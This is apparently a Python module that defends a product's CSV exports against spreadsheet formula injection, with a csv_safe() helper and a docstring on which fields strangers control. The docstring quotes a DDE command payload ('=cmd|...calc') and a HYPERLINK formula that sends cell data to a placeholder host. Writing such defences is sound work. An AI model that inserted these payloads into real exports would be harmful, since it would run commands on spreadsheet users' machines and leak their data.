"""One place that knows a CSV cell is executable code in a spreadsheet.

Excel, Google Sheets and LibreOffice all treat a cell whose text begins with
``=``, ``+``, ``-`` or ``@`` as a *formula*, not a string. ``=cmd|'/c calc'!A1``
in a downloaded CSV is a command the operator's machine runs when they
double-click the export — the payload never touches this application, so nothing
here fails and nothing is logged.

The reason this has its own module rather than a private helper in the router
that first needed it: **the untrusted text in this product does not come from
the operator, so the endpoints that need defusing are not the ones that look
like they take input.** Three of the five columns in the email-send export are
written by strangers:

* ``to_email`` — the scraper harvests addresses off third-party websites, and a
  local-part is close enough to freeform text for this.
* ``subject`` — carried through from inbound mail on a reply thread.
* ``error`` — the SMTP rejection string, i.e. **whatever the receiving mail
  server chose to say**. A hostile MX can return
  ``550 =HYPERLINK("http://x/"&A1,"Click")`` and have it stored verbatim.

``import_export`` defused its two exports and the send-history export beside it
did not, because the helper was private to the other file. Import
:func:`csv_safe` here for any new export instead of writing a third copy.
"""

# Characters a spreadsheet reads as the start of a formula.
#
# ``\t`` and ``\r`` are here because a cell beginning with either can be parsed
# as a fresh field or record by some importers, which shifts the payload into a
# column where it *is* leading. The csv writer quotes them; not every consumer
# of a .csv file is a conformant csv reader.
CSV_FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")


def csv_safe(value) -> str:
    """Return ``value`` as a cell that a spreadsheet will read as text.

    Prefixes a single quote when the cell would otherwise open a formula. The
    quote is the standard mitigation: spreadsheets strip it on display and treat
    the remainder as a literal string.

    The leading-whitespace check is not decoration. Sheets and LibreOffice trim
    a cell before deciding whether it is a formula, so ``" =1+1"`` evaluates
    while ``"=1+1"`` — the only form a first-character test can see — is the one
    everybody remembers to block.
    """
    text = "" if value is None else str(value)
    if not text:
        return text
    stripped = text.lstrip()
    if stripped and stripped[0] in CSV_FORMULA_PREFIXES:
        return "'" + text
    return text
